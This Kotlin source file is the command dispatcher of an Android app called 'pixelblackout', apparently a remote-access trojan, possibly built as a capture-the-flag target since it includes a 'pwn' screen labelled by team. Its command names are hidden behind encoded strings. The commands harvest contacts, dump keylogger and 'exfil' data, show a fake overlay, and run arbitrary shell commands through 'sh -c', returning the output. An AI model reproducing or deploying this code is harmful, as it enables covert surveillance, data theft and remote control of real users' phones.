package com.example.pixelblackout.managers

import android.content.Context
import android.content.Intent
import android.provider.ContactsContract
import java.io.File
import com.example.pixelblackout.activities.PwnedActivity
import com.example.pixelblackout.utils.StringVault
import org.json.JSONArray
import org.json.JSONObject

sealed class CommandResult {
    data class Success(val message: String) : CommandResult()
    data class Failure(val error: String) : CommandResult()
}

class CommandDispatcher(
    private val context: Context
) {
    private val supportedCommands = setOf(
        Tokens.CMD_PING,
        Tokens.CMD_CONTACTS,
        Tokens.CMD_OPENFAKE,
        Tokens.CMD_DUMPKEYS,
        Tokens.CMD_DECODE,
        Tokens.CMD_HEX,
        Tokens.CMD_EXEC,
        Tokens.CMD_PWN
    )

    fun execute(command: String, argument: String? = null): CommandResult {
        val normalized = command.lowercase()
        if (normalized !in supportedCommands) {
            return CommandResult.Failure(Tokens.ERR_UNKNOWN)
        }
        return when (normalized) {
            Tokens.CMD_PING -> CommandResult.Success(Tokens.RESULT_PONG)
            Tokens.CMD_CONTACTS -> getContacts()
            Tokens.CMD_OPENFAKE -> CommandResult.Success(Tokens.RESULT_OVERLAY)
            Tokens.CMD_DUMPKEYS -> dump(argument)
            Tokens.CMD_DECODE -> decode(argument)
            Tokens.CMD_HEX -> hex(argument)
            Tokens.CMD_EXEC -> exec(argument)
            Tokens.CMD_PWN -> pwn(argument)
            else -> CommandResult.Failure(Tokens.ERR_UNEXPECTED)
        }
    }

    // Bridge for native pipeline to avoid exposing plaintext JSON in Kotlin.
    fun executeForNative(command: String, argument: String?): String {
        val result = execute(command, argument)
        val response = JSONObject()
        when (result) {
            is CommandResult.Success -> {
                response.put("status", "ok")
                response.put("data", result.message)
            }
            is CommandResult.Failure -> {
                response.put("status", "error")
                response.put("data", result.error)
            }
        }
        return response.toString()
    }

    private fun pwn(argument: String?): CommandResult {
        val team = argument?.takeIf { it.isNotBlank() } ?: "UNKNOWN"
        return runCatching {
            val intent = Intent(context, PwnedActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(PwnedActivity.EXTRA_TEAM, "TEAM ${team}")
            }
            context.startActivity(intent)
            CommandResult.Success("pwned:$team")
        }.getOrElse { CommandResult.Failure(Tokens.ERR_UNEXPECTED) }
    }

    private fun hex(argument: String?): CommandResult {
        if (argument.isNullOrEmpty()) {
            return CommandResult.Failure(Tokens.ERR_MISSING_ARG)
        }
        val builder = StringBuilder(argument.length * 4)
        argument.forEach { ch ->
            builder.append(Tokens.HEX_FORMAT.format(ch.code))
        }
        return CommandResult.Success(builder.toString())
    }

    private fun decode(argument: String?): CommandResult {
        if (argument.isNullOrBlank()) {
            return CommandResult.Failure(Tokens.ERR_MISSING_ARG)
        }
        return runCatching {
            val decoded = SecretCipher.decrypt(argument)
            if (decoded.isEmpty()) CommandResult.Failure(Tokens.ERR_DECODE_FAILED) else CommandResult.Success(decoded)
        }.getOrElse { CommandResult.Failure(Tokens.ERR_DECODE_EXCEPTION) }
    }

    private fun getContacts(): CommandResult {
        val resolver = context.contentResolver
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )
        return try {
            val cursor = resolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection,
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + Tokens.SQL_ASC
            )
            if (cursor == null) {
                return CommandResult.Failure(Tokens.ERR_NO_CURSOR)
            }
            val entries = mutableListOf<Pair<String, String>>()
            cursor.use {
                val nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (cursor.moveToNext() && entries.size < 5) {
                    val name = if (nameIndex >= 0) cursor.getString(nameIndex) else Tokens.PLACEHOLDER
                    val number = if (numberIndex >= 0) cursor.getString(numberIndex) else Tokens.PLACEHOLDER
                    entries.add(name to number)
                }
            }
            if (entries.isEmpty()) {
                CommandResult.Failure(Tokens.ERR_NO_DATA)
            } else {
                persistContacts(entries)
                val rendered = entries.joinToString(prefix = Tokens.LIST_PREFIX, postfix = Tokens.LIST_SUFFIX) { (name, number) -> "$name${Tokens.SEPARATOR_COLON}$number" }
                CommandResult.Success(rendered)
            }
        } catch (sec: SecurityException) {
            CommandResult.Failure(Tokens.ERR_NO_PERMISSION)
        }
    }

    private fun persistContacts(entries: List<Pair<String, String>>) {
        runCatching {
            val dir = File(context.filesDir, Tokens.DIR_CFG)
            if (!dir.exists()) {
                dir.mkdirs()
            }
            val payload = JSONArray()
            entries.forEach { (name, number) ->
                val obj = JSONObject()
                obj.put("name", name)
                obj.put("number", number)
                payload.put(obj)
            }
            val encrypted = SecretCipher.encrypt(payload.toString())
            File(dir, Tokens.FILE_PROFILE).writeText(encrypted)
        }
    }

    private fun dump(argument: String?): CommandResult {
        if (argument?.equals(Tokens.ARG_SYSTEM, ignoreCase = true) == true) {
            ExfilManager.prepare(context)
            val packageData = ExfilManager.readPackage(context)
                ?: return CommandResult.Failure(Tokens.ERR_NO_PACKAGE)
            return CommandResult.Success(packageData)
        }
        return CommandResult.Success(KeyLogStore.readAll(context))
    }

    private fun exec(argument: String?): CommandResult {
        if (argument.isNullOrBlank()) {
            return CommandResult.Failure(Tokens.ERR_MISSING_ARG)
        }
        return runCatching {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", argument))
            val stdout = process.inputStream.bufferedReader().use { it.readText() }.trim()
            val stderr = process.errorStream.bufferedReader().use { it.readText() }.trim()
            val exit = process.waitFor()
            val result = buildString {
                append(Tokens.LABEL_CODE).append(exit)
                if (stdout.isNotEmpty()) {
                    append(Tokens.LABEL_STDOUT).append(stdout)
                }
                if (stderr.isNotEmpty()) {
                    append(Tokens.LABEL_STDERR).append(stderr)
                }
            }
            CommandResult.Success(result)
        }.getOrElse { CommandResult.Failure(Tokens.ERR_EXEC) }
    }

    private object Tokens {
        val CMD_PING = StringVault.reveal("U0pNRA==")
        val CMD_CONTACTS = StringVault.reveal("REZXQExNV0JAV1A=")
        val CMD_OPENFAKE = StringVault.reveal("TFNGTUVCSEY=")
        val CMD_DUMPKEYS = StringVault.reveal("R1ZOU0hGWlA=")
        val CMD_DECODE = StringVault.reveal("R0ZATEdG")
        val CMD_HEX = StringVault.reveal("S0Zb")
        val CMD_EXEC = StringVault.reveal("RltGQA==")
        val CMD_PWN = StringVault.reveal("U1RN")

        val ERR_UNKNOWN = StringVault.reveal("dm1obWx0bXxgbG5uYm1n")
        val ERR_UNEXPECTED = StringVault.reveal("dm1me3NmYHdmZw==")
        val ERR_MISSING_ARG = StringVault.reveal("bmpwcGptZHxicWR2bmZtdw==")
        val ERR_DECODE_FAILED = StringVault.reveal("Z2ZgbGdmfGViam9mZw==")
        val ERR_DECODE_EXCEPTION = StringVault.reveal("Z2ZgbGdmfGZ7YGZzd2psbQ==")
        val ERR_NO_CURSOR = StringVault.reveal("bWx8YHZxcGxx")
        val ERR_NO_DATA = StringVault.reveal("bWx8Z2J3Yg==")
        val ERR_NO_PERMISSION = StringVault.reveal("bWx8c2ZxbmpwcGpsbQ==")
        val ERR_NO_PACKAGE = StringVault.reveal("bWx8c2JgaGJkZg==")
        val ERR_EXEC = StringVault.reveal("ZntmYHxmcXFscQ==")

        val RESULT_PONG = StringVault.reveal("U0xNRA==")
        val RESULT_OVERLAY = StringVault.reveal("TFVGUU9CWg==")

        val SQL_ASC = StringVault.reveal("A2JwYA==")
        val PLACEHOLDER = StringVault.reveal("HA==")
        val LIST_PREFIX = StringVault.reveal("eA==")
        val LIST_SUFFIX = StringVault.reveal("fg==")
        val SEPARATOR_COLON = StringVault.reveal("GQ==")
        val DIR_CFG = StringVault.reveal("QEVE")
        val FILE_PROFILE = StringVault.reveal("U1FMRUpPRg1HQlc=")
        val ARG_SYSTEM = StringVault.reveal("UFpQV0ZO")
        val HEX_FORMAT = StringVault.reveal("f1sGExFb")
        val LABEL_CODE = StringVault.reveal("QExHRh4=")
        val LABEL_STDOUT = StringVault.reveal("GFBXR0xWVx4=")
        val LABEL_STDERR = StringVault.reveal("GFBXR0ZRUR4=")
    }
}
